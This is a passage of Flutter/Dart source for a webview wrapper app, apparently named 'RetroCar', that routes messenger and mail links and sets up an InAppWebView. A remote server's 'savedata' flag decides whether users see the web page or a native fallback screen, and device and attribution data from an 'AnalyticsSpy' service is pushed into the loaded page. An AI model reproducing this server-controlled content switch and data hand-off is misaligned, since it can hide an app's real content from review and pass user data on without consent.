      final Map<String, String> retroCarQp = uri.queryParameters;
      final String? retroCarDomain = retroCarQp['domain'];

      if (retroCarDomain != null && retroCarDomain.isNotEmpty) {
        return Uri.https(
          't.me',
          '/$retroCarDomain',
          <String, String>{
            if (retroCarQp['start'] != null) 'start': retroCarQp['start']!,
          },
        );
      }

      final String retroCarPath =
      uri.path.isNotEmpty ? uri.path : '';

      return Uri.https(
        't.me',
        '/$retroCarPath',
        uri.queryParameters.isEmpty ? null : uri.queryParameters,
      );
    }

    if ((retroCarScheme == 'http' || retroCarScheme == 'https') &&
        uri.host.toLowerCase().endsWith('t.me')) {
      return uri;
    }

    if (retroCarScheme == 'viber') {
      return uri;
    }

    if (retroCarScheme == 'whatsapp') {
      final Map<String, String> retroCarQp = uri.queryParameters;
      final String? retroCarPhone = retroCarQp['phone'];
      final String? retroCarText = retroCarQp['text'];

      if (retroCarPhone != null && retroCarPhone.isNotEmpty) {
        return Uri.https(
          'wa.me',
          '/${retroCarDigitsOnly(retroCarPhone)}',
          <String, String>{
            if (retroCarText != null && retroCarText.isNotEmpty)
              'text': retroCarText,
          },
        );
      }

      return Uri.https(
        'wa.me',
        '/',
        <String, String>{
          if (retroCarText != null && retroCarText.isNotEmpty)
            'text': retroCarText,
        },
      );
    }

    if ((retroCarScheme == 'http' || retroCarScheme == 'https') &&
        (uri.host.toLowerCase().endsWith('wa.me') ||
            uri.host.toLowerCase().endsWith('whatsapp.com'))) {
      return uri;
    }

    if (retroCarScheme == 'skype') {
      return uri;
    }

    if (retroCarScheme == 'fb-messenger') {
      final String retroCarPath = uri.pathSegments.isNotEmpty
          ? uri.pathSegments.join('/')
          : '';
      final Map<String, String> retroCarQp = uri.queryParameters;

      final String retroCarId =
          retroCarQp['id'] ?? retroCarQp['user'] ?? retroCarPath;

      if (retroCarId.isNotEmpty) {
        return Uri.https(
          'm.me',
          '/$retroCarId',
          uri.queryParameters.isEmpty ? null : uri.queryParameters,
        );
      }

      return Uri.https(
        'm.me',
        '/',
        uri.queryParameters.isEmpty ? null : uri.queryParameters,
      );
    }

    if (retroCarScheme == 'sgnl') {
      final Map<String, String> retroCarQp = uri.queryParameters;
      final String? retroCarPhone = retroCarQp['phone'];
      final String? retroCarUsername = retroCarQp['username'];

      if (retroCarPhone != null && retroCarPhone.isNotEmpty) {
        return Uri.https(
          'signal.me',
          '/#p/${retroCarDigitsOnly(retroCarPhone)}',
        );
      }

      if (retroCarUsername != null && retroCarUsername.isNotEmpty) {
        return Uri.https(
          'signal.me',
          '/#u/$retroCarUsername',
        );
      }

      final String retroCarPath = uri.pathSegments.join('/');
      if (retroCarPath.isNotEmpty) {
        return Uri.https(
          'signal.me',
          '/$retroCarPath',
          uri.queryParameters.isEmpty ? null : uri.queryParameters,
        );
      }

      return uri;
    }

    if (retroCarScheme == 'tel') {
      return Uri.parse('tel:${retroCarDigitsOnly(uri.path)}');
    }

    if (retroCarScheme == 'mailto') {
      return uri;
    }

    if (retroCarScheme == 'bnl') {
      final String retroCarNewPath =
      uri.path.isNotEmpty ? uri.path : '';
      return Uri.https(
        'bnl.com',
        '/$retroCarNewPath',
        uri.queryParameters.isEmpty ? null : uri.queryParameters,
      );
    }

    return uri;
  }

  Future<bool> retroCarOpenMailWeb(Uri mailto) async {
    final Uri retroCarGmailUri = retroCarGmailizeMailto(mailto);
    return retroCarOpenWeb(retroCarGmailUri);
  }

  Uri retroCarGmailizeMailto(Uri mailUri) {
    final Map<String, String> retroCarQueryParams = mailUri.queryParameters;

    final Map<String, String> retroCarParams = <String, String>{
      'view': 'cm',
      'fs': '1',
      if (mailUri.path.isNotEmpty) 'to': mailUri.path,
      if ((retroCarQueryParams['subject'] ?? '').isNotEmpty)
        'su': retroCarQueryParams['subject']!,
      if ((retroCarQueryParams['body'] ?? '').isNotEmpty)
        'body': retroCarQueryParams['body']!,
      if ((retroCarQueryParams['cc'] ?? '').isNotEmpty)
        'cc': retroCarQueryParams['cc']!,
      if ((retroCarQueryParams['bcc'] ?? '').isNotEmpty)
        'bcc': retroCarQueryParams['bcc']!,
    };

    return Uri.https('mail.google.com', '/mail/', retroCarParams);
  }

  Future<bool> retroCarOpenWeb(Uri uri) async {
    try {
      if (await launchUrl(
        uri,
        mode: LaunchMode.inAppBrowserView,
      )) {
        return true;
      }

      return await launchUrl(
        uri,
        mode: LaunchMode.externalApplication,
      );
    } catch (error) {
      debugPrint('openInAppBrowser error: $error; url=$uri');
      try {
        return await launchUrl(
          uri,
          mode: LaunchMode.externalApplication,
        );
      } catch (_) {
        return false;
      }
    }
  }

  Future<bool> retroCarOpenExternal(Uri uri) async {
    try {
      return await launchUrl(
        uri,
        mode: LaunchMode.externalApplication,
      );
    } catch (error) {
      debugPrint('openExternal error: $error; url=$uri');
      return false;
    }
  }

  void _handleServerSavedata(String savedata) {
    debugPrint('onServerResponse savedata: $savedata');

    if (savedata == 'false') {
      Navigator.pushAndRemoveUntil(
        context,
        MaterialPageRoute<Widget>(
          builder: (BuildContext context) => RetroCarHelpLite(),
        ),
            (Route<dynamic> route) => false,
      );
    } else if (savedata == 'true') {
      // остаёмся на вебе
    }
  }

  @override
  Widget build(BuildContext context) {
    retroCarBindNotificationTap();

    Widget retroCarContent = Stack(
      children: <Widget>[
        if (retroCarCoverVisible)
          const RetroCarNeonLoader()
        else
          Container(
            color: Colors.black,
            child: Stack(
              children: <Widget>[
                InAppWebView(
                  key: ValueKey<int>(retroCarWebViewKeyCounter),
                  initialSettings: InAppWebViewSettings(
                    javaScriptEnabled: true,
                    disableDefaultErrorPage: true,
                    mediaPlaybackRequiresUserGesture: false,
                    allowsInlineMediaPlayback: true,
                    allowsPictureInPictureMediaPlayback: true,
                    useOnDownloadStart: true,
                    javaScriptCanOpenWindowsAutomatically: true,
                    useShouldOverrideUrlLoading: true,
                    supportMultipleWindows: true,
                    transparentBackground: true,
                  ),
                  initialUrlRequest: URLRequest(
                    url: WebUri(retroCarHomeUrl),
                  ),
                  onWebViewCreated: (InAppWebViewController controller) {
                    retroCarWebViewController = controller;

                    retroCarBosunViewModel ??= RetroCarBosunViewModel(
                      retroCarDeviceProfile: retroCarDeviceProfile,
                      retroCarAnalyticsSpy: retroCarAnalyticsSpyService,
                    );

                    retroCarCourier ??= RetroCarCourierService(
                      retroCarBosun: retroCarBosunViewModel!,
                      retroCarGetWebViewController: () =>
                      retroCarWebViewController,
                    );

                    controller.addJavaScriptHandler(
                      handlerName: 'onServerResponse',
                      callback: (List<dynamic> args) {
                        debugPrint('onServerResponse raw args: $args');

                        if (args.isEmpty) return null;

                        try {
                          if (args[0] is Map) {
                            final dynamic retroCarRaw =
                            (args[0] as Map)['savedata'];

                            print("saveDATA "+retroCarRaw.toString());
                            _handleServerSavedata(
                                retroCarRaw?.toString() ?? '');
                          } else if (args[0] is String) {
                            _handleServerSavedata(args[0] as String);
                          } else if (args[0] is bool) {
                            _handleServerSavedata(
                                (args[0] as bool).toString());
                          }
                        } catch (e, st) {
                          debugPrint(
                              'onServerResponse error: $e\n$st');
                        }

                        return null;
                      },
                    );
                  },
                  onLoadStart: (
                      InAppWebViewController controller,
                      Uri? uri,
                      ) async {
                    setState(() {
                      retroCarStartLoadTimestamp =
                          DateTime.now().millisecondsSinceEpoch;
                    });

                    final Uri? retroCarViewUri = uri;
                    if (retroCarViewUri != null) {
                      if (retroCarIsBareEmail(retroCarViewUri)) {
                        try {
                          await controller.stopLoading();
                        } catch (_) {}
                        final Uri retroCarMailto =
                        retroCarToMailto(retroCarViewUri);
                        await retroCarOpenMailWeb(retroCarMailto);
                        return;
                      }

                      final String retroCarScheme =
                      retroCarViewUri.scheme.toLowerCase();
                      if (retroCarScheme != 'http' &&
                          retroCarScheme != 'https') {
                        try {
                          await controller.stopLoading();
                        } catch (_) {}
                      }
                    }
                  },
                  onLoadError: (
                      InAppWebViewController controller,
                      Uri? uri,
                      int code,
                      String message,
                      ) async {
                    final int retroCarNow =
                        DateTime.now().millisecondsSinceEpoch;
                    final String retroCarEvent =
                        'InAppWebViewError(code=$code, message=$message)';

                    await retroCarPostStat(
                      event: retroCarEvent,
                      timeStart: retroCarNow,
                      timeFinish: retroCarNow,
                      url: uri?.toString() ?? '',
                      appSid:
                      retroCarAnalyticsSpyService.retroCarAppsFlyerUid,
                      firstPageLoadTs: retroCarFirstPageTimestamp,
                    );
                  },
                  onReceivedError: (
                      InAppWebViewController controller,
                      WebResourceRequest request,
                      WebResourceError error,
                      ) async {
                    final int retroCarNow =
                        DateTime.now().millisecondsSinceEpoch;
                    final String retroCarDescription =
                    (error.description ?? '').toString();
                    final String retroCarEvent =
                        'WebResourceError(code=$error, message=$retroCarDescription)';

                    await retroCarPostStat(
                      event: retroCarEvent,
                      timeStart: retroCarNow,
                      timeFinish: retroCarNow,
                      url: request.url?.toString() ?? '',
                      appSid:
                      retroCarAnalyticsSpyService.retroCarAppsFlyerUid,
                      firstPageLoadTs: retroCarFirstPageTimestamp,
                    );
                  },
                  onLoadStop: (
                      InAppWebViewController controller,
                      Uri? uri,
                      ) async {
                    await retroCarPushDeviceInfo();
                    await retroCarPushAppsFlyerData();

                    setState(() {
                      retroCarCurrentUrl = uri.toString();
                    });

                    Future<void>.delayed(
                      const Duration(seconds: 20),
                          () {
                        retroCarSendLoadedOnce(
                          url: retroCarCurrentUrl.toString(),
                          timestart: retroCarStartLoadTimestamp,
                        );
                      },
                    );
                  },
                  shouldOverrideUrlLoading: (
                      InAppWebViewController controller,
                      NavigationAction action,
                      ) async {
                    final Uri? retroCarUri = action.request.url;
                    if (retroCarUri == null) {
                      return NavigationActionPolicy.ALLOW;
                    }

                    if (retroCarIsBareEmail(retroCarUri)) {
                      final Uri retroCarMailto =
                      retroCarToMailto(retroCarUri);
                      await retroCarOpenMailWeb(retroCarMailto);
                      return NavigationActionPolicy.CANCEL;
                    }

                    final String retroCarScheme =
                    retroCarUri.scheme.toLowerCase();

                    if (retroCarScheme == 'mailto') {
                      await retroCarOpenMailWeb(retroCarUri);
                      return NavigationActionPolicy.CANCEL;
                    }

                    if (retroCarScheme == 'tel') {
                      await launchUrl(
                        retroCarUri,
                        mode: LaunchMode.externalApplication,
                      );
                      return NavigationActionPolicy.CANCEL;
                    }

                    final String retroCarHost =
                    retroCarUri.host.toLowerCase();
                    final bool retroCarIsSocial = retroCarHost
                        .endsWith('facebook.com') ||
                        retroCarHost.endsWith('instagram.com') ||
                        retroCarHost.endsWith('twitter.com') ||
                        retroCarHost.endsWith('x.com');

                    if (retroCarIsSocial) {
                      await retroCarOpenExternal(retroCarUri);
                      return NavigationActionPolicy.CANCEL;
                    }

                    if (retroCarIsPlatformLink(retroCarUri)) {
                      final Uri retroCarWebUri =
                      retroCarHttpizePlatformUri(retroCarUri);
                      await retroCarOpenExternal(retroCarWebUri);
                      return NavigationActionPolicy.CANCEL;
                    }

                    if (retroCarScheme != 'http' &&
                        retroCarScheme != 'https') {
                      return NavigationActionPolicy.CANCEL;
                    }

                    return NavigationActionPolicy.ALLOW;
                  },
                  onCreateWindow: (
                      InAppWebViewController controller,
                      CreateWindowAction request,
                      ) async {
                    final Uri? retroCarUri = request.request.url;
                    if (retroCarUri == null) {
                      return false;
                    }

                    if (retroCarIsBareEmail(retroCarUri)) {
                      final Uri retroCarMailto =
                      retroCarToMailto(retroCarUri);
                      await retroCarOpenMailWeb(retroCarMailto);
                      return false;
                    }

                    final String retroCarScheme =
                    retroCarUri.scheme.toLowerCase();

                    if (retroCarScheme == 'mailto') {
                      await retroCarOpenMailWeb(retroCarUri);
                      return false;
                    }

                    if (retroCarScheme == 'tel') {
                      await launchUrl(
                        retroCarUri,
                        mode: LaunchMode.externalApplication,
                      );
                      return false;
                    }

                    final String retroCarHost =
                    retroCarUri.host.toLowerCase();
                    final bool retroCarIsSocial = retroCarHost
                        .endsWith('facebook.com') ||
                        retroCarHost.endsWith('instagram.com') ||
                        retroCarHost.endsWith('twitter.com') ||
                        retroCarHost.endsWith('x.com');

                    if (retroCarIsSocial) {
                      await retroCarOpenExternal(retroCarUri);
                      return false;
                    }

                    if (retroCarIsPlatformLink(retroCarUri)) {
                      final Uri retroCarWebUri =
                      retroCarHttpizePlatformUri(retroCarUri);
                      await retroCarOpenExternal(retroCarWebUri);
                      return false;
                    }

                    if (retroCarScheme == 'http' ||
                        retroCarScheme == 'https') {
                      controller.loadUrl(
                        urlRequest: URLRequest(
                          url: WebUri(retroCarUri.toString()),
                        ),
                      );
                    }

                    return false;
                  },
                  onDownloadStartRequest: (
                      InAppWebViewController controller,
                      DownloadStartRequest req,
                      ) async {
                    await retroCarOpenExternal(req.url);
                  },
                ),
                Visibility(
                  visible: !retroCarVeilVisible,
                  child: const RetroCarNeonLoader(),
                ),
              ],
            ),
          ),
      ],
    );

    if (retroCarUseSafeArea) {
      retroCarContent = SafeArea(child: retroCarContent);
    }

    return AnnotatedRegion<SystemUiOverlayStyle>(
      value: SystemUiOverlayStyle.light,
      child: Scaffold(
        backgroundColor: Colors.black,
        body: SizedBox.expand(
          child: ColoredBox(
            color: Colors.black,
            child: retroCarContent,
          ),
        ),
      ),
    );
  }
}

// ============================================================================
// main()
// ============================================================================

Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();

  await Firebase.initializeApp();
  FirebaseMessaging.onBackgroundMessage(retroCarFcmBackgroundHandler);

  if (Platform.isAndroid) {
    await InAppWebViewController.setWebContentsDebuggingEnabled(true);
  }

  tz_data.initializeTimeZones();

  runApp(
    const MaterialApp(
      debugShowCheckedModeBanner: false,
      home: RetroCarHall(),
    ),
  );
}